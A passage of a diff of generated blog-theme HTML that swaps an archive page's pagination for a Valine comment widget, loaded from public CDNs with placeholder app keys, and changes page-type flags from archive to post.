-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
   
-    </div></section>
   
 
-    
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/archives/2021/page/7/">&amp;laquo; Prev</a><a class="page-number" href="/archives/2021/">1</a><span class="space">&hellip;</span><a class="page-number" href="/archives/2021/page/6/">6</a><a class="page-number" href="/archives/2021/page/7/">7</a><span class="page-number current">8</span><a class="page-number" href="/archives/2021/page/9/">9</a><a class="page-number" href="/archives/2021/page/10/">10</a><a class="extend next" rel="next" href="/archives/2021/page/9/">Next &amp;raquo;</a>
-    </nav>
+  
+
+  
+
   
 
 
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
           </div>
         </div>
       </div>
@@ -516,8 +492,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
